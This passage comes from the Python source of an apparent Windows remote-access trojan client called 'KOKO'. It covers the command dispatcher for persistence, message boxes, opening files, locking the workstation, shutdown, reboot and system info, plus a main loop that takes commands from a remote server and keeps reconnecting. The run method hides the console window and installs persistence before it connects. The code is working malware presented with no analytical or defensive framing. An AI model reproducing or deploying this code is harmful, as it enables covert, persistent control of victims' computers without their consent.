                    pyperclip.copy(" ".join(args))
                    self.send_data("[+] Clipboard set")
                except:
                    self.send_data("[-] Install pyperclip")

        # Control
        elif command == "persistence":
            self.send_data("[+] 🔒 Added" if self.add_persistence() else "[-] Failed")
        elif command == "msgbox":
            self.send_data(self.show_message(" ".join(args)) if args else "[!] Usage: msgbox <text>")
        elif command == "open":
            self.send_data(self.open_file(args[0]) if args else "[!] Usage: open <file>")
        elif command == "lock":
            self.send_data(self.lock_workstation())
        elif command == "shutdown":
            self.send_data(self.shutdown_system())
        elif command == "reboot":
            self.send_data(self.reboot_system())
        elif command == "info":
            self.send_data(self.system_info())
        else:
            self.send_data(f"[-] Unknown command: {command}")

        return False

    def main_loop(self):
        while self.running:
            if not self.connected:
                if AUTO_RECONNECT:
                    print(f"[*] Reconnecting in {RECONNECT_DELAY}s...")
                    time.sleep(RECONNECT_DELAY)
                    self.connect()
                else:
                    break
                continue

            try:
                data = self.receive_data()
                if not data:
                    self.connected = False
                    continue

                if self.process_command(data):
                    break

            except Exception as e:
                print(f"[-] Error: {e}")
                self.connected = False

        try:
            self.socket.close()
        except:
            pass
        print("[-] Disconnected")

    def run(self):
        self.hide_console()
        self.add_persistence()

        print(f"[*] KOKO Windows Client v6.1 starting...")
        print(f"[*] Target server: {self.host}:{self.port}")
        print(f"[*] Persistence: Active")
        print(f"[*] Connecting...")

        while not self.connected and self.running:
            if self.connect():
                break
            print(f"[*] Retrying in {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)

        self.main_loop()

if __name__ == "__main__":
    KokoClientWin(SERVER_HOST, SERVER_PORT).run()
